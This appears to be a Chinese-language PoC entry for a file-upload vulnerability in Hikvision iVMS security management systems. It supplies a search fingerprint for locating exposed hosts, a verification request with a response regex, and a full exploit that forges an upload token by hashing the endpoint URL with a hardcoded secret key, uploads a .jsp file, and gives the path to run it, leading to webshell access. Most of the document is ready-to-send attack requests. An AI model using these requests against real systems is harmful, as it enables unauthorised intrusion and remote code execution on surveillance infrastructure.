﻿# 海康iVMS综合安防存在文件上传漏洞

> 更新时间：2024-03-15

> 漏洞编号：

> 漏洞说明：海康威视iVMS系统存在在野 0day 漏洞，攻击者通过获取密钥任意构造token，请求/resourceOperations/upload接口任意上传文件，导致获取服务器webshell权限，同时可远程进行恶意代码执行。

> 漏洞特征：web.body="/views/home/file/installPackage.rar"

> 验证脚本：HTTP

```
POST /eps/api/resourceOperations/upload HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: ISMS_8700_Sessionname=7634604FBE659A8532E666FE4AA41BE9
Upgrade-Insecure-Requests: 1

service=http%3A%2F%2Fip:port%3Ax%2Fhome%2Findex.action
```

> 响应代码特征：200

> 响应内容特征：^(?=.*?token)(?=.*?empty).*?$

> 上传文件定位：

> 验证文件来源：海康iVMS综合安防存在文件上传漏洞.poc

```
备注说明：
进一步POC：
POST /eps/api/resourceOperations/upload?token=构造的token值 HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Cookie: ISMS_8700_Sessionname=A29E70BEA1FDA82E2CF0805C3A389988
Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryGEJwiloiPo
Upgrade-Insecure-Requests: 1
 
------WebKitFormBoundaryGEJwiloiPo
Content-Disposition: form-data; name="fileUploader";filename="dudesite.jsp"
Content-Type: image/jpeg
 
dudesite
------WebKitFormBoundaryGEJwiloiPo

token值需要进行MD5(http://ip:port/eps/api/resourceOperations/uploadsecretKeyIbuilding)的值（32位大写）
显示上传成功且返回了resourceUuid值
验证路径：http://ip:port/eps/upload/resourceUuid的值.jsp
```